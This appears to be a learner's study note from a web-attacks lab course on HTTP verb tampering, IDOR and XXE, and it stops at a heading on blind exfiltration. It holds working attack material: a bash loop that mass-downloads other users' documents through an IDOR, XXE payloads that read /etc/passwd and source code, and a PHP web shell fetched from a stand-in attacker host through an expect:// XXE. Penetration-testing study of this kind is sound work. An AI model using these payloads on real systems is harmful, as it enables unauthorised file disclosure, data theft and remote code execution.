here we are going to talk about 3 types of attacks that are most likely to be found .

1. HTTP verb tampering
2. Insecure Direct object references (IDOR)
3. XML external entity ( XXE )

## Over view :

- about : HTTP verb tampering :
    - if the server accepts and response to any request that is not post or get then this may reveal vulnerability .
        
        because some of the other HTTP methods may allow things like uploading file or other things .
        
        the http methods :
        
        - [`OPTIONS`](https://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html#sec9.2)
        - [`GET`](https://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html#sec9.3)
        - [`HEAD`](https://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html#sec9.4)
        - [`POST`](https://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html#sec9.5)
        - [`PUT`](https://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html#sec9.6)
        - [`DELETE`](https://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html#sec9.7)
        - [`TRACE`](https://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html#sec9.8)
        - [`CONNECT`](https://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html#sec9.9)
        
        - extra details from owsap :
            
            ## How to Test
            
            As the HTML standard does not support request methods other than GET  
            or POST, we will need to craft custom HTTP requests to test the other  
            methods. We highly recommend using a tool to do this, although we will  
            demonstrate how to do manually as well.
            
            ### Manual HTTP Verb Tampering Testing
            
            This example is written using the netcat package from openbsd  
            (standard with most Linux distributions). You may also use telnet  
            (included with Windows) in a similar fashion.
            
            1. Crafting custom HTTP requests
                
                Each HTTP 1.1 request follows the following basic formatting and syntax. Elements surrounded by brackets `[ ]` are contextual to your application. The empty newline at the end is required.
                
                `[METHOD] /[index.htm] HTTP/1.1 host: [www.example.com]`
                
                In order to craft separate requests, you can manually type each  
                request into netcat or telnet and examine the response. However, to  
                speed up testing, you may also store each request in a separate file.  
                This second approach is what we’ll demonstrate in these examples. Use  
                your favorite editor to create a text file for each method. Modify for  
                your application’s landing page and domain.
                
                1.1 OPTIONS
                
                `OPTIONS /index.html HTTP/1.1 host: www.example.com`
                
                1.2 GET
                
                `GET /index.html HTTP/1.1 host: www.example.com`
                
                1.3 HEAD
                
                `HEAD /index.html HTTP/1.1 host: www.example.com`
                
                1.4 POST
                
                `POST /index.html HTTP/1.1 host: www.example.com`
                
                1.5 PUT
                
                `PUT /index.html HTTP/1.1 host: www.example.com`
                
                1.6 DELETE
                
                `DELETE /index.html HTTP/1.1 host: www.example.com`
                
                1.7 TRACE
                
                `TRACE /index.html HTTP/1.1 host: www.example.com`
                
                1.8 CONNECT
                
                `CONNECT /index.html HTTP/1.1 host: www.example.com`
                
            2. Sending HTTP requests
                
                For each method or method text file, send the request to your web server via netcat or telnet on port 80 (HTTP):
                
                `nc www.example.com 80 < OPTIONS.http.txt`
                
            3. Parsing HTTP responses
                
                Although each HTTP method can potentially return different  
                results, there is only a single valid result for all methods other than  
                GET and POST. The web server should either ignore the request completely  
                or return an error. Any other response indicates a test failure as the  
                server is responding to methods/verbs that are unnecessary. These  
                methods should be disabled.
                
                An example of a failed test (ie, the server supports OPTIONS despite no need for it):
                
                [![](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/images/OPTIONS_verb_tampering.png)](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/images/OPTIONS_verb_tampering.png)
                
                _Figure 4.7.3-1: OPTIONS Verb Tampering_
                
            
            ### Automated HTTP Verb Tampering Testing
            
            If you are able to analyze your application via simple HTTP status  
            codes (200 OK, 501 Error, etc) - then the following bash script will  
            test all available HTTP methods.
            
            `#!/bin/bash for webservmethod in GET POST PUT TRACE CONNECT OPTIONS PROPFIND; do printf "$webservmethod " ; printf "$webservmethod / HTTP/1.1\nHost: $1\n\n" | nc -q 1 $1 80 | grep "HTTP/1.1" done`
            
            Code copied verbatim from the [Penetration Testing Lab blog](https://pentestlab.blog/2012/12/20/http-methods-identification/)
            
            ## References
            
            ### Whitepapers
            
            - [Arshan Dabirsiaghi: “Bypassing URL Authentication and Authorization with HTTP Verb Tampering”](https://web.archive.org/web/20081116154150/http://www.aspectsecurity.com/documents/Bypassing_VBAAC_with_HTTP_Verb_Tampering.pdf)
        - HTB info about them :
            
            |   |   |
            |---|---|
            |Verb|Description|
            |`HEAD`|Identical to a GET request, but its response only contains the `headers`, without the response body|
            |`PUT`|Writes the request payload to the specified location|
            |`DELETE`|Deletes the resource at the specified location|
            |`OPTIONS`|Shows different options accepted by a web server, like accepted HTTP verbs|
            |`PATCH`|Apply partial modifications to the resource at the specified location|
            
- about : IDOR insecure direct object references :
    - it is simply that the application takes user supplied input and uses it to retrieve an object without performing sufficient authorization checks.
    - so as an example displaying your id according to your username so if you write the username of another user it will tell you its id instead of yours or displaying your profile via your username so if you used another user name it display the profile of another user instead of yours .
- about : XXE :XML external entity :
    
    - An _XML External Entity_ attack is a type of attack against an  
        application that parses XML input. This attack occurs when **XML input  
        containing a reference to an external entity is processed by a weakly  
        configured XML parser**
    - like when we used an upload attack to upload an svg or pdf that conatins a xml containing references to external entity that did displayed the password file in the back-end server .
    
      
    
      
    

  

# lets get deeper in each of the three attacks :) :

  

## 1. HTTP verp tampering :

- using options to test for accepted requests via :
    
    ```
    curl -i -X OPTIONS http://ip:port/
    ```
    
    HEAD:
    
    gets the response without the body only the headers .
    
    PUT :
    
    send request to specified location like /admin/reset.php
    
    DELETE:
    
    you give it a location and it deletes the resources at this location .
    
    OPTIONS:
    
    show different options accepted by a web server , like accepted HTTP verbs .
    
    PATCH:
    
    it patchs ( apply partial modifications in the specified locatioin ) .
    
    ---
    
    some maliciouse input detectors detects only a specific type of http method and ignore other types so we can try to change the method while pentesting for xss or xxe or …
    
    ---
    
    ## lets talk about IDOR
    
    insecure direct object references .
    
    id=123 …. what about id=124 ??
    
    - Whenever we receive a specific file or resource, we should study the  
        HTTP requests to look for URL parameters or APIs with an object  
        reference (e.g. `?uid=1` or `?filename=file_1.pdf`). These are mostly found in URL parameters or APIs but may also be found in other HTTP headers, like cookies.
    - In the most basic cases, we can try incrementing the values of the object references to retrieve other data, like (`?uid=2`) or (`?filename=file_2.pdf`).  
        We can also use a fuzzing application to try thousands of variations  
        and see if they return any data. Any successful hits to files that are  
        not our own would indicate an IDOR vulnerability.
    - If we want to perform more advanced IDOR attacks, we may need to register multiple users and compare their HTTP requests and object references. This may allow us to understand how the URL parameters and unique identifiers are being calculated and then calculate them for other users to gather their data.
    - We can click on [`CTRL+SHIFT+C`] in Firefox to enable the `element inspector`, and then click on any of the links to view their HTML source code, and we will get the following:
        
        Code: html
        
        ```
        <li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li><li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
        ```
        
        We can pick any unique word to be able to `grep` the link of the file. In our case, we see that each link starts with `<li class='pure-tree_link'>`, so we may `curl` the page and `grep` for this line, as follows:
        
        ```
        KareemAlsadeq@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
        <li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
        ```
        
        As we can see, we were able to capture the document links  
        successfully. We may now use specific bash commands to trim the extra  
        parts and only get the document links in the output. However, it is a  
        better practice to use a `Regex` pattern that matches strings between `/document` and `.pdf`, which we can use with `grep` to only get the document links, as follows:
        
        ```
        KareemAlsadeq@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"/documents/Invoice_3_06_2020.pdf
        /documents/Report_3_01_2020.pdf
        ```
        
        Now, we can use a simple `for` loop to loop over the `uid` parameter and return the document of all employees, and then use `wget` to download each document link:
        
        Code: bash
        
        ```
        #!/bin/bash
        
        url="http://SERVER_IP:PORT"
        
        for i in {1..10}; do
                for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                        wget -q $url/$link
                done
        done
        ```
        
        When we run the script, it will download all documents from all employees with `uids`  
        between 1-10, thus successfully exploiting the IDOR vulnerability to  
        mass enumerate the documents of all employees. This script is one  
        example of how we can achieve the same objective. Try using a tool like  
        Burp Intruder or ZAP Fuzzer, or write another Bash or PowerShell script  
        to download all documents.
        
          
        
    - to hash it is a one way only so we can just hash things but we can dehash it but we maniplutae that to ashive oour purpose anyway via hashing our guessed values or what ever and if it get the same hash as the target then we knew the plantext value .
    -   
        
        ```
        KareemAlsadeq@htb[/htb]$ echo -n 1 | md5sumc4ca4238a0b923820dcc509a6f75849b -
        ```
        
        **Tip:** We are using the `-n` flag with `echo`, and the `-w 0` flag with `base64`, to avoid adding newlines, in order to be able to calculate the `md5` hash of the same value, without hashing newlines, as that would change the final `md5` hash.
        
        We can test this by `base64` encoding our `uid=1`, and then hashing it with `md5`, as follows:
        
        ```
        KareemAlsadeq@htb[/htb]$ echo -n 1 | base64 -w 0 | md5sumcdd96d3cc73d1dbdaffa03cc6cd7339b -
        ```
        

## Lets start talking about our third attack which is the XXE

xml external entity injection .

- mainly xxe is an input sanitization vulnerabiltiy
- xml is a extensible markup language not a programing language .
- to get a XML vulnerability :
    
    1. locate a place where the input is sent as a xml request and intercept it with burp
    2. **Note:** Some web applications may default to a JSON format in HTTP  
        request, but may still accept other formats, including XML. So, even if a  
        web app sends requests in a JSON format, we can try changing the `Content-Type` header to `application/xml`, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm).  
        If the web application does accept the request with XML data, then we  
        may also test it against XXE vulnerabilities, which may reveal an  
        unanticipated XXE vulnerability.
        
    
    ```
    <!DOCTYPE email [
      <!ENTITY company SYSTEM "file:///etc/passwd">
    ]>
    ```
    
    **Tip:** In certain Java web applications, we may also be able to  
    specify a directory instead of a file, and we will get a directory  
    listing instead, which can be useful for locating sensitive files.
    
      
    
    Another benefit of local file disclosure is the ability to obtain the  
    source code of the web application. This would allow us to perform a `Whitebox Penetration Test`  
    to unveil more vulnerabilities in the web application, or at the very  
    least reveal secret configurations like database passwords or API keys.
    
    So, let us see if we can use the same attack to read the source code of the `index.php` file, as follows:
    
    [![](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_file_php.jpg)](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_file_php.jpg)
    
    As we can see, this did not work, as we did not get any content. This happened because `the file we are referencing is not in a proper XML format, so it fails to be referenced as an external XML entity`. If a file contains some of XML's special characters (e.g. `<`/`>`/`&`),  
    it would break the external entity reference and not be used for the  
    reference. Furthermore, we cannot read any binary data, as it would also  
    not conform to the XML format.
    
    Luckily, PHP provides wrapper filters that allow us to base64 encode  
    certain resources 'including files', in which case the final base64  
    output should not break the XML format. To do so, instead of using `file://` as our reference, we will use PHP's `php://filter/` wrapper. With this filter, we can specify the `convert.base64-encode` encoder as our filter, and then add an input resource (e.g. `resource=index.php`), as follows:
    
    Code: xml
    
    ```
    <!DOCTYPE email [
      <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
    ]>
    ```
    
    With that, we can send our request, and we will get the base64 encoded string of the `index.php` file:
    
    With that, we can send our request, and we will get the base64 encoded string of the `index.php` file:
    
    [![](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_php_filter.jpg)](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_php_filter.jpg)
    
    We can select the base64 string, click on Burp's Inspector tab (on  
    the right pane), and it will show us the decoded file. For more on PHP  
    filters, you can refer to the [File Inclusion / Directory Traversal](https://academy.hackthebox.com/module/details/23) module.
    
    `This trick only works with PHP web applications.` The next section will discuss a more advanced method for reading source code, which should work with any web framework.
    
      
    
      
    
    n addition to reading local files, we may be able to gain code  
    execution over the remote server. The easiest method would be to look  
    for `ssh` keys, or attempt to utilize a hash stealing trick  
    in Windows-based web applications, by making a call to our server. If  
    these do not work, we may still be able to execute commands on PHP-based  
    web applications through the `PHP://expect` filter, though this requires the PHP `expect` module to be installed and enabled.
    
    If the XXE directly prints its output 'as shown in this section', then we can execute basic commands as `expect://id`,  
    and the page should print the command output. However, if we did not  
    have access to the output, or needed to execute a more complicated  
    command 'e.g. reverse shell', then the XML syntax may break and the  
    command may not execute.
    
    The most efficient method to turn XXE into RCE is by fetching a web  
    shell from our server and writing it to the web app, and then we can  
    interact with it to execute commands. To do so, we can start by writing a  
    basic PHP web shell and starting a python web server, as follows:
    
    ```
    KareemAlsadeq@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.phpKareemAlsadeq@htb[/htb]$ sudo python3 -m http.server 80
    ```
    
    Now, we can use the following XML code to execute a `curl` command that downloads our web shell into the remote server:
    
    Code: xml
    
    ```
    <?xml version="1.0"?>
    <!DOCTYPE email [
      <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
    ]>
    <root><name></name><tel></tel><email>&company;</email><message></message></root>
    ```
    
    **Note:** We replaced all spaces in the above XML code with `$IFS`, to avoid breaking the XML syntax. Furthermore, many other characters like `|`, `>`, and `{` may break the code, so we should avoid using them.
    
    Once we send the request, we should receive a request on our machine for the `shell.php` file, after which we can interact with the web shell on the remote server for code execution.
    
    **Note:** The expect module is not enabled/installed  
    by default on modern PHP servers, so this attack may not always work.  
    This is why XXE is usually used to disclose sensitive local files and  
    source code, which may reveal additional vulnerabilities or ways to gain  
    code execution.
    
    ---
    
    ## Blind Data Exfiltration
    
    - mainly blind : ) >